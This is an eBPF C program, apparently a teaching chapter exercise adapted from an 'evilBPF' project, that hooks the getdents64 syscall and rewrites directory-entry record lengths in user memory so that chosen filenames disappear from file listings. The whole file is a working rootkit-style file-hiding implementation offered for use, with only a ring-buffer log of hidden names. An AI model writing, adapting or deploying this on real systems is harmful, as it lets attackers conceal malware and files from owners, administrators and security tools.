// Ch10 Inode Cloak — hide files from getdents64 by rewriting d_reclen.
// Pattern adapted from evilBPF/src/hide_pid (filename filter instead of PID).
#include "vmlinux.h"
#include <bpf/bpf_helpers.h>
#include <bpf/bpf_tracing.h>
#include <bpf/bpf_core_read.h>

char LICENSE[] SEC("license") = "GPL";

#define NAME_MAX 64
#define MAX_HIDDEN 32

struct hidden_name { char name[NAME_MAX]; };

// map: set of filenames to hide (key = name, value = 1)
struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __type(key, struct hidden_name);
    __type(value, u8);
    __uint(max_entries, MAX_HIDDEN);
} hidden SEC(".maps");

// per-syscall state keyed by pid_tgid
struct dctx {
    u64 dirp;      // user buffer
    long bytes;    // bytes written by kernel
};
struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __type(key, u64);
    __type(value, struct dctx);
    __uint(max_entries, 10240);
} active SEC(".maps");

// ringbuf for audit
struct evt { u32 pid; char comm[16]; char hidden[NAME_MAX]; };
struct {
    __uint(type, BPF_MAP_TYPE_RINGBUF);
    __uint(max_entries, 1 << 18);
} events SEC(".maps");

SEC("tp/syscalls/sys_enter_getdents64")
int handle_enter(struct trace_event_raw_sys_enter *ctx)
{
    u64 id = bpf_get_current_pid_tgid();
    struct dctx d = { .dirp = (u64)ctx->args[1], .bytes = 0 };
    bpf_map_update_elem(&active, &id, &d, BPF_ANY);
    return 0;
}

SEC("tp/syscalls/sys_exit_getdents64")
int handle_exit(struct trace_event_raw_sys_exit *ctx)
{
    u64 id = bpf_get_current_pid_tgid();
    struct dctx *d = bpf_map_lookup_elem(&active, &id);
    if (!d) return 0;
    long ret = ctx->ret;
    if (ret <= 0) { bpf_map_delete_elem(&active, &id); return 0; }

    u64 dirp = d->dirp;
    long bpos = 0;
    struct linux_dirent64 *prev = NULL;
    u16 prev_reclen = 0;

    // Verifier bound: iterate at most 64 entries per call.
    #pragma unroll
    for (int i = 0; i < 64; i++) {
        if (bpos >= ret) break;
        struct linux_dirent64 de = {};
        if (bpf_probe_read_user(&de, sizeof(de), (void *)(dirp + bpos)) < 0) break;
        u16 rlen = de.d_reclen;
        if (rlen < sizeof(de) || rlen > 1024) break;

        struct hidden_name key = {};
        bpf_probe_read_user_str(&key.name, NAME_MAX,
                                (void *)(dirp + bpos + offsetof(struct linux_dirent64, d_name)));

        u8 *hit = bpf_map_lookup_elem(&hidden, &key);
        if (hit) {
            struct evt *e = bpf_ringbuf_reserve(&events, sizeof(*e), 0);
            if (e) {
                e->pid = id >> 32;
                bpf_get_current_comm(&e->comm, sizeof(e->comm));
                __builtin_memcpy(e->hidden, key.name, NAME_MAX);
                bpf_ringbuf_submit(e, 0);
            }
            if (prev) {
                // Extend previous entry to swallow this one.
                u16 new_reclen = prev_reclen + rlen;
                bpf_probe_write_user(&((struct linux_dirent64 *)(dirp + (bpos - prev_reclen)))->d_reclen,
                                     &new_reclen, sizeof(new_reclen));
                prev_reclen = new_reclen;
            } else {
                // First entry hidden: shift offset (best-effort — many apps still see remaining entries).
                u64 zero_ino = 0;
                bpf_probe_write_user(&((struct linux_dirent64 *)(dirp + bpos))->d_ino,
                                     &zero_ino, sizeof(zero_ino));
            }
        } else {
            prev = (struct linux_dirent64 *)(dirp + bpos);
            prev_reclen = rlen;
        }
        bpos += rlen;
    }
    bpf_map_delete_elem(&active, &id);
    return 0;
}
